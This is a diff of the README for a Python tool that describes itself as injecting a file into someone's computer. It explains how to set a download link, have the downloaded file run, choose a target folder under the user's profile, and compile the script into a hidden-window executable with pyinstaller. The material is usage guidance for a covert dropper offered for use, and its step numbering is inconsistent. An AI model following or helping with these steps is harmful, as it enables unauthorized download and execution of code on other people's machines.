@@ -4,12 +4,11 @@ very simple python script that allows you to inject a file into someones compute
 
 ## How To Use
  
- 1. download the code. install the dependencies too
- 2. open up Notepad or any text editor. In this case, im using Visual Studio Code
- 3. open up "main.py" in your text editor and go to line 9. Replace DOWNLOAD_LINK to your download link. View the example below
+ 1. go to the release tab and download the zip folder and extract it. Install all the dependencies too.
+ 2. open up "main.py" in your text editor and replace DOWNLOAD_LINK to your download link. View the example below
  ![](exmaple1.png)
- 4. go to line 11. If you are injecting a python file and want it to be ran, set this to True. Otherwise, leave it false
- 5. look at line 22. here you will add the path you want the file injected to in quotations. Leave out the filename as they are already covered and make sure to add an extra backslash to the path. you can also add user + to the beginning if you want to add C:\Users\username to the beginning of the path. Here is an example:
+ 1. If you are injecting a python file and want it to be ran, set this to True. Otherwise, leave it false
+ 2. look at line 22. here you will add the path you want the file injected to in quotations. Leave out the filename as they are already covered and make sure to add an extra backslash to the path. you can also add user + to the beginning if you want to add C:\Users\username to the beginning of the path. Here is an example:
    
   ![2](example2.png)
   
@@ -23,7 +22,7 @@ very simple python script that allows you to inject a file into someones compute
   
   You can also add a full path in the quotations of this is too complicated
 
-  6. if you want to compile the code into an executable, open up command prompt in the current directory and type: `pyinstaller --clean --onefile --noconsole -i NONE main.py`
+  6. if you want to compile the code into an executable, run "build.bat"; or, open up command prompt in the current directory and type: `pyinstaller --clean --onefile --noconsole -i NONE main.py`
   
 
 
